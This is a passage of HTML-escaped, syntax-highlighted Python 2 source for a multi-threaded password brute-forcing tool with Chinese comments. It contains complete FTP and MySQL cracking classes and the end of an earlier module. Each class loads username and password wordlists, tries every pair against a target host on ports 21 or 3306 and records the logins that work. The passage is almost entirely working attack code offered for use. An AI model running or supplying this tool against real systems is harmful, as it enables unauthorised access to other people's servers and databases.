&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################FTP爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">FtpBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for FtpBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(FtpBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp &lt;span style="color:#f92672">=&lt;/span> FTP()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>connect(self&lt;span style="color:#f92672">.&lt;/span>host, &lt;span style="color:#ae81ff">21&lt;/span>, self&lt;span style="color:#f92672">.&lt;/span>timeout)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>login(name, pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.05&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ftp&lt;span style="color:#f92672">.&lt;/span>quit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout...&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> xrange(&lt;span style="color:#ae81ff">1&lt;/span>,self&lt;span style="color:#f92672">.&lt;/span>threadnum&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>thread)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads&lt;span style="color:#f92672">.&lt;/span>append(t)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>setDaemon(&lt;span style="color:#66d9ef">True&lt;/span>) &lt;span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> t&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">KeyboardInterrupt&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>is_exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Exit the program...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Waiting...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_result(self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> finishetime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;Used time: &lt;/span>&lt;span style="color:#e6db74">%f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (finishetime&lt;span style="color:#f92672">-&lt;/span>starttime)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#################MySQL爆破模块#################&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">MysqlBruter&lt;/span>(CommonFun):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for MysqlBruter&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, &lt;span style="color:#f92672">*&lt;/span>args):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(MysqlBruter, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options,arg) &lt;span style="color:#f92672">=&lt;/span> args
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>host
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>userfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>userfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passfile &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>passfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>threadnum &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>timeout &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>timeout
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>set_log(self&lt;span style="color:#f92672">.&lt;/span>host)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist &lt;span style="color:#f92672">=&lt;/span> Queue&lt;span style="color:#f92672">.&lt;/span>Queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print self&lt;span style="color:#f92672">.&lt;/span>host,self&lt;span style="color:#f92672">.&lt;/span>userfile,self&lt;span style="color:#f92672">.&lt;/span>passfile,self&lt;span style="color:#f92672">.&lt;/span>threadnum
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">get_queue&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>userfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ulines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">with&lt;/span> open(self&lt;span style="color:#f92672">.&lt;/span>passfile, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> plines &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> name &lt;span style="color:#f92672">in&lt;/span> ulines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> pwd &lt;span style="color:#f92672">in&lt;/span> plines:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pwd &lt;span style="color:#f92672">=&lt;/span> pwd&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">thread&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>empty():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> name,pwd &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>get()&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn &lt;span style="color:#f92672">=&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>connect(host&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host, user&lt;span style="color:#f92672">=&lt;/span>name, passwd&lt;span style="color:#f92672">=&lt;/span>pwd, db&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;mysql&amp;#39;&lt;/span>, port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3306&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> conn:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># time.sleep(0.05)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> conn&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[OK] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>result&lt;span style="color:#f92672">.&lt;/span>append(s)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>timeout:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,&lt;span style="color:#e6db74">&amp;#34;Timeout&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>qlist&lt;span style="color:#f92672">.&lt;/span>put(name &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#39;:&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> error &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[Error] &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (name,pwd)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>show_log(self&lt;span style="color:#f92672">.&lt;/span>host,error)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>get_queue()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> starttime &lt;span style="color:#f92672">=&lt;/span> time&lt;span style="color:#f92672">.&lt;/span>time()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> threads &lt;span style="color:#f92672">=&lt;/span> []
